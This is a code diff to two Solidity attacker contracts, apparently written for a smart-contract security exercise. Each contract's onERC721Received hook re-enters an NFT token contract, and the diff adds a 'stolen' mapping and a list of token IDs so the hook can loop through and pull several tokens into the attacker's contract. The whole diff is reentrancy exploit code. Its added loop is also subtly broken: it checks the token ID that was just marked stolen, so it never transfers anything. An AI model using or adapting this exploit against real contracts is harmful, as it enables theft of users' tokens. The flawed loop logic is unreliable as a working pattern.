@@ -11,6 +11,8 @@ contract TokenReceiver is ERC721Holder {
     constructor(LeToken _token) {
         token = _token;
     }
+    uint256[] public tokenIds;
+    mapping(uint256 => bool) private stolen;
 
     function onERC721Received(
         address sender,
@@ -26,11 +28,21 @@ contract TokenReceiver is ERC721Holder {
         } else {
             console.log("Returning from transfer");
             // re-enter tokens contract
-            token.safeTransferFrom(sender, address(this), tokenId);
-            //Cannot use delegation because the call to this contract is made from the token contract, not from the user.
+            stolen[tokenId] = true;
+            // re-enter tokens contract
+            for (uint i; i< tokenIds.length; i++) {
+                if (!stolen[tokenId]) {
+                    token.safeTransferFrom(sender, address(this), tokenIds[i]);
+                    stolen[tokenIds[i]] = true;
+                }
+            }
         }
         
         return this.onERC721Received.selector; 
+    }
+
+    function addNewToken(uint256 tokenId) public {
+        tokenIds.push(tokenId);
     }
 }
 
@@ -39,6 +51,9 @@ contract WizardTokenReceiver is ERC721Holder {
     constructor(WizardToken _token) {
         token = _token;
     }
+
+    uint256[] public tokenIds;
+    mapping(uint256 => bool) private stolen;
 
     function onERC721Received(
         address sender,
@@ -53,11 +68,20 @@ contract WizardTokenReceiver is ERC721Holder {
             token.safeMint(address(this));
         } else {
             console.log("Returning from transfer");
+            stolen[tokenId] = true;
             // re-enter tokens contract
-            token.safeTransferFrom(sender, address(this), tokenId);
-            //Cannot use delegation because the call to this contract is made from the contract, not from the user.
+            for (uint i; i< tokenIds.length; i++) {
+                if (!stolen[tokenId]) {
+                    token.safeTransferFrom(sender, address(this), tokenIds[i]);
+                    stolen[tokenIds[i]] = true;
+                }
+            }            
         }
         
         return this.onERC721Received.selector; 
+    }
+
+    function addNewToken(uint256 tokenId) public {
+        tokenIds.push(tokenId);
     }
 }
